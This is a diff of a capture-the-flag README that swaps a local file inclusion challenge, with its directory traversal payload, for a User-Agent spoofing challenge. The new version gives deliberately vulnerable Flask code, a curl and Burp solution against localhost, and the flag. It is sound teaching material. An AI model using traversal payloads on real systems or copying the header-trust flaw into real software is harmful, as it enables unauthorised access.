@@ -1,21 +1,50 @@
-# 🚩 Company Asset Viewer (LFI Challenge)
+# 🕰️ The 1993 Time Capsule (User-Agent Challenge)
 
-**Category:** Web Exploitation / Local File Inclusion (LFI)
-**Difficulty:** Beginner
+**Category:** Web Exploitation / HTTP Headers  
+**Difficulty:** Medium  
 **Tech Stack:** Python (Flask), Docker
 
 ## 📝 Description
-Welcome to the "Company Asset Viewer." This internal tool allows employees to view approved company assets (like icons and logos) dynamically. However, the developer might have been a little too trusting with how file paths are handled.
+**"Legacy Access Only."**
 
-**Objective:** Read the content of \`/flag.txt\` stored on the server's root directory.
+Our intelligence team has located a legacy LNM Security Portal running on an ancient server. The system is heavily restricted and rejects all modern connections. It appears to only accept connections from a very specific, historical workstation environment from the early 90s.
+
+**Objective:** Bypass the "Protocol Mismatch" error and retrieve the internal flag.
 
 ## 🔍 The Vulnerability
-The application uses a \`file\` parameter to load images.
-* **Intended Usage:** \`?file=static/icon.png\`
-* **The Flaw:** The code checks if the path *starts with* \`static/\`, but it does not sanitize directory traversal sequences.
+The application relies on the `User-Agent` HTTP header to identify the client.
+* **Intended Behavior:** The server expects the client to be an ancient browser ("NCSA Mosaic 2.0").
+* **The Flaw:** `User-Agent` is a client-side header. Hackers can change this string to anything they want, tricking the server into thinking they are using the required software.
 
-## 🔓 Solution
-To solve this, use **Directory Traversal** (\`../\`) to move up from the \`static\` folder.
+### Vulnerable Code Snippet (`useragent.py`)
+```python
+REQUIRED_UA = "NCSA_Mosaic/2.0 (Windows 3.1)"
 
-**Exploit Payload:**
-\`http://localhost:5001/?file=static/../../../../flag.txt\`
+@app.route('/', methods=['POST'])
+def challenge():
+    user_agent = request.headers.get('User-Agent', '')
+    
+    # The Vulnerability: Trusting the client input blindly
+    if REQUIRED_UA in user_agent:
+        msg = "Handshake Successful. Flag: " + FLAG
+    else:
+        msg = "ERROR: Protocol Mismatch." 
+```
+
+🔓 Solution
+To solve this, we must spoof our User-Agent string to match the requirement found in the hints.
+
+Method 1: Using Curl
+```curl -A "NCSA_Mosaic/2.0 (Windows 3.1)" -X POST http://localhost:5080```
+
+Method 2: Using Burp Suite
+
+Intercept the request to http://localhost:5080.
+
+Send it to Repeater.
+
+Change User-Agent: Mozilla/5.0... to User-Agent: NCSA_Mosaic/2.0 (Windows 3.1).
+
+Send the request.
+
+Flag: LNMHACKS{u$er_4g3nt_i$_n0t_m6_F0rt3}
